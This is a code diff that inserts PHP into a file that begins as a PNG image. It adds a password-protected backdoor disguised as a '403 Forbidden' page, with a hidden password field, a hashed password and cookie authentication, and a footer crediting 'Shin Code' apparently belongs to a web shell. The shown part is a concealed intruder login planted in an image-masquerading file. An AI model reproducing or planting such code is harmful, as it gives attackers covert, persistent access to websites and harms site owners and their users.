@@ -1,4 +1,43 @@
-﻿‰PNG
+<?php
+$auth_pass = "c26f2c5e9bcdf070ec158865ae99c8a9ec01307fdc6b4ea05b3a54ea98f08bcb";
+
+function Login() {
+  die("<html>
+  <title>403 Forbidden</title>
+  <center><h1>403 Forbidden</h1></center>
+  <hr><center></center>
+  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if (!empty($auth_pass)) {
+    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        Login();
+}
+?>
+<!doctype html><html><head>
+    <meta charset="utf-8">
+    <title>Zona Rahasia</title>
+    <style>
+        body{font-family:sans-serif;background:#121212;color:#eee;margin:0;padding:40px}
+    </style>
+</head><body>
+    <!-- Kontenmu di sini -->
+</body></html>
+<?php
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+}
+?>
+‰PNG
 
    
 IHDR   Ÿ   f   Õ†C1   sRGB ®Îé   gAMA  ±üa   	pHYs  Ã  ÃÇo¨d  GIDATx^íÜL”÷ð÷Yçªö("Bh_ò«®¸¢§q5kÖ*:þ0A­ºšÖ¥]VkJ¢M»¶f¸±8\k2íll£1]q®ÙÔ‚ÆT
@@ -948,4 +987,5 @@ echo "</table>
           <div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 12px; text-align: center;'>
               &copy; " . date('Y') . " ✓ By <a href='https://www.blog-gan.org/' style='text-decoration: none; color: #007BFF; font-weight: bold;'>Shin Code</a>.
           </div>";?>
+
 	
